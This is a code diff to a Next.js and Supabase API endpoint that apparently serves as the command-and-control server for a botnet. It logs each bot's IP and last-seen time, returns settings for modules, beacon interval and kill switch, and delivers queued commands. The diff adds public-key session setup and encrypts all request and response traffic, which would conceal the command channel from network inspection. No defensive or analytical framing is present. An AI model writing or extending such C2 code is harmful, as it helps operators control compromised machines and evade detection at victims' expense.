@@ -1,5 +1,6 @@
 import { createClient } from "@supabase/supabase-js";
 import { NextRequest, NextResponse } from "next/server";
+import { deriveSessionKey, decryptPayload, encryptPayload } from "@/lib/crypto";
 
 function getSupabase() {
     return createClient(
@@ -10,7 +11,19 @@ function getSupabase() {
 
 export async function POST(request: NextRequest) {
     try {
-        const body = await request.json();
+        const botPubKeyB64 = request.headers.get("X-Bot-PubKey");
+        if (!botPubKeyB64) {
+            return NextResponse.json({ error: "missing pubkey" }, { status: 400 });
+        }
+
+        const sessionKey = await deriveSessionKey(botPubKeyB64);
+
+        const encData = await request.json();
+        if (!encData || !encData.iv || !encData.ciphertext) {
+            return NextResponse.json({ error: "invalid payload" }, { status: 400 });
+        }
+
+        const body = await decryptPayload(sessionKey, encData.iv, encData.ciphertext);
         const { bot_id } = body;
 
         if (!bot_id) {
@@ -22,20 +35,17 @@ export async function POST(request: NextRequest) {
             || request.headers.get("x-real-ip")
             || "unknown";
 
-        // Update last_seen and IP
         await supabase
             .from("bots")
             .update({ last_seen_at: new Date().toISOString(), ip_address: ip, status: "active" })
             .eq("bot_id", bot_id);
 
-        // Get current config
         const { data: config } = await supabase
             .from("bot_configs")
             .select("*")
             .eq("bot_id", bot_id)
             .single();
 
-        // Get pending commands
         const { data: commands } = await supabase
             .from("commands")
             .select("*")
@@ -43,20 +53,19 @@ export async function POST(request: NextRequest) {
             .eq("status", "pending")
             .order("created_at", { ascending: true });
 
-        // Mark them as delivered
         if (commands && commands.length > 0) {
             const ids = commands.map((c) => c.id);
-            await supabase
-                .from("commands")
-                .update({ status: "delivered" })
-                .in("id", ids);
+            await supabase.from("commands").update({ status: "delivered" }).in("id", ids);
         }
 
-        return NextResponse.json({
+        const responseObj = {
             status: "ok",
             config: config || { modules_enabled: [], beacon_interval_sec: 300, kill_switch: false },
             commands: commands || [],
-        });
+        };
+
+        const encResponse = await encryptPayload(sessionKey, responseObj);
+        return NextResponse.json(encResponse);
     } catch (e) {
         console.error("Heartbeat error:", e);
         return NextResponse.json({ error: "internal error" }, { status: 500 });
